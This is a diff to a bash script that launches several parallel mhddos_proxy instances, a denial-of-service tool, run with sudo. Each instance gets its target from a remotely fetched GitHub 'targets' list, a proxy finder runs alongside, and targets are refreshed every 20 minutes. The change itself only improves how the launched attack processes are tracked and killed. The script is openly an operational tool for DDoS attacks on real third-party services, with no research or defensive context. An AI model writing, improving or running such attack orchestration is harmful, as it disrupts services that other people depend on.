@@ -63,14 +63,25 @@ fi
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack with such parameters: $num_of_copies parallel atack(s) -t $threads --rpc $rpc $debug...\033[1;0m"
 sleep 7s
 
-trap 'echo signal received!; kill "${PID}"; kill "${PID1}"; wait "${PID}"; wait "${PID1}"; ctrl_c' SIGINT SIGTERM
+trap 'echo signal received!; ctrl_c' SIGINT SIGTERM
 
 function ctrl_c() {
         echo "Exiting..."
-	sleep 3s
-	exit
-	echo "Exiting failed - close the window with terminal!!!"
-	sleep 60s
+  	sleep 3s
+  	for i in ${PIDS[@]}; 
+  	do 	
+		echo "$i"
+    		kill ${i} 
+  	done 
+  	for i in ${PIDS[@]};
+  	do 
+   		echo "$i"
+		wait ${i} 
+  	done
+  	exit
+	
+  	echo "Exiting failed - close the window with terminal!!!"
+  	sleep 60s
 }
 
 # Restart attacks and update targets list every 20 minutes
@@ -90,6 +101,9 @@ do
 	fi
 	
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
+	
+	declare -a PIDS
+	j=0
       
    	# Launch multiple mhddos_proxy instances with different targets.
    	for i in $random_numbers
@@ -97,14 +111,16 @@ do
             echo -e "\n I = $i"
             # Filter and only get lines that not start with "#". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_docker | cat | grep "^[^#]")")
-           
-
+	    
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
             echo "sudo python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
-            
+	    
             cd ~/mhddos_proxy
             sudo python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug&
 	    PID="$!"
+	    PIDS[j]=${PID}
+	    echo -e "${PIDS[j]}\n"
+	    j=$(( $j + 1 ))
             sleep 20s
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
@@ -115,7 +131,8 @@ do
 		
 	cd ~/proxy_finder
 	sudo python3 finder.py&
-	PID1="$!"
+	PID="$!"
+	PIDS[j]=${PID}
 	
    	sleep $restart_interval
 	clear
